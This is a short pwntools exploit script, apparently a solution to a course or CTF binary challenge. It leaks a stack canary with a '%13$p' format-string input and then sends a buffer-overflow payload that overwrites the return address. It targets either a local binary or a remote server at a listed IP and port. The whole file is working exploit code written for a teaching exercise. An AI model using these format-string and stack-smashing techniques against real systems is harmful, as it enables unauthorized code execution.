
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        b *vuln+110
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    # p = process("./6")
    context.arch = 'amd64'

    context.log_level = 'debug'
    p.sendlineafter(b"NIM:", b"13523035")
    p.sendlineafter(b"Challenge:", b"6")

    p.recvuntil(b"Oops: ")
    address = int(p.recvline()[:-1], 16)
    p.recvline()
    p.sendline(b"%13$p")

    leak = p.recvline()[:-1]
    canary = int(leak, 16)
    payload = cyclic(56)
    payload += p64(canary) + b"B" * 8
    payload += p64(address-26)
    with open("payload.bin", "wb") as f:
        f.write(b"%13$p\n")
        f.write(payload)
    # write your payload here
    p.sendline(payload) # meng-inject payload ke dalam binary
    print(p.recvall())
    # p.interactive() # flush to stdout 

solve()

